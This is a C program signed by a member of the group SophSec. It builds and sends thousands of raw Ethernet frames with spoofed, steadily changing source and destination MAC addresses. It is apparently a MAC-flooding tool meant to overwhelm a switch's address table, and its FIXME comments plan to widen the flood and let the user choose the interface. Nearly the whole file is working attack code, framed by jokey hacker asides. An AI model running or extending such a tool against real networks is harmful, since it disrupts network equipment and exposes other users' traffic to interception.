/*
 *
 * lulz of contempt
 * by drraid [gmail] /or/ [sophsec.com]
 *
 * [SophSec] - RE%
 *
 * to build: gcc -o contempt_lulz contempt_lulz.c -lnet
 *
 * If you don't know what this file is for,
 * then it is probably not for you ;]
 *
 * ps 2 pierce: it's only because we love u <33
 *
 * sophsec: sketchy shit, competitive prices
**
*/

#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <libnet.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>


struct lulnet_hdr
{
	unsigned int four;
	unsigned short two;
};

int main(int argc, char *argv[])
{
	libnet_t *lnet;	
	int ret;
	size_t loop;
	char errbuf[LIBNET_ERRBUF_SIZE];
	char payload[16];
	struct lulnet_hdr destlul, srclul;


	memset((char *)&destlul, 0, sizeof(destlul));
	memset((char *)&srclul, 0, sizeof(srclul));
	memset(payload, 0, sizeof(payload));
	memcpy(payload, "LULZ OF CONTEMPT", 16);

	/* FIXME: need to optomize this loop. 
	 * this is too slow right now.. but will still probably work
	 * I imagine the init() and destroy() for the lnet is the
	 * most expensive.. possible a raw sockets implementation
	 * would be quicker. 
	*/

	/* FIXME: user should control how big loop gets 
	 * Also, loop should be able to account for larger
	 * than a size_t -- possibly a second nested loop?
	 * */
	for (loop = 0; loop < 10000; ++loop)
	{

		/* FIXME: 
		 * these will only loop the 4gb space.
		 * the .two value should be used as well
		 * whenever the .four wraps. needs to be fixed
		 * at the same time as loop
		*/
		++destlul.four;
		--srclul.four;

		/* FIXME: get interface from user; for now vmware testing */
		lnet = libnet_init(LIBNET_LINK, "vmnet1", errbuf);
		if (!lnet)
		{
			printf("[fail] unable to acquire libnet_t: %s\n", errbuf);
			exit(1);
		}


		/* i herd u like mudkipz */
		ret = libnet_build_ethernet(&destlul, 
					&srclul, 
					0x1337, 
					payload,
					sizeof(payload),
					lnet,
					0);

		if (ret == -1)
		{
			printf("[fail] libnet_build_eth: %s\n", errbuf);
			libnet_destroy(lnet);
			exit(2);
		}

		ret = libnet_write(lnet);

		if (ret == -1)
		{
			printf("[fail] libnet_write: %s\n", errbuf);
			libnet_destroy(lnet);
			exit(3);
		}
		
		libnet_destroy(lnet);
	}
	printf("wrote packetz to wire..\n");

	/* end */
	exit(0);
}
